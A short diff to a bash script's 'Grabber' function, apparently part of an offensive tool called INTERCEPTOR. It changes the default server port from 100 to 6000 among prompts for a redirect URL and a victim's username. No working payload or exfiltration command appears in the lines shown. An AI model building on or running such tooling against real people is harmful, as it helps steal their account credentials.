@@ -151,11 +151,11 @@ function Grabber {
         printf "${GREEN}\n[+]${WHITE}INSERT THE REDIRECT-URL\n\n"
         read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Url
     done
-    printf "${GREEN}\n[+]${WHITE}INSERT YOUR SERVER PORT(DEFAULT:100)\n\n"
+    printf "${GREEN}\n[+]${WHITE}INSERT YOUR SERVER PORT(DEFAULT:6000)\n\n"
     read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
     if [ "$Port" == "" ];
         then
-        Port="100"   
+        Port="6000"   
     fi
     printf "${GREEN}\n[+]${WHITE}WOULD YOU LIKE TO SAVE THESE VALUES?(1)YES(2)NO"
     printf "${GREEN}\n[+]${WHITE}USERNAME:${YELLOW}$Victim"
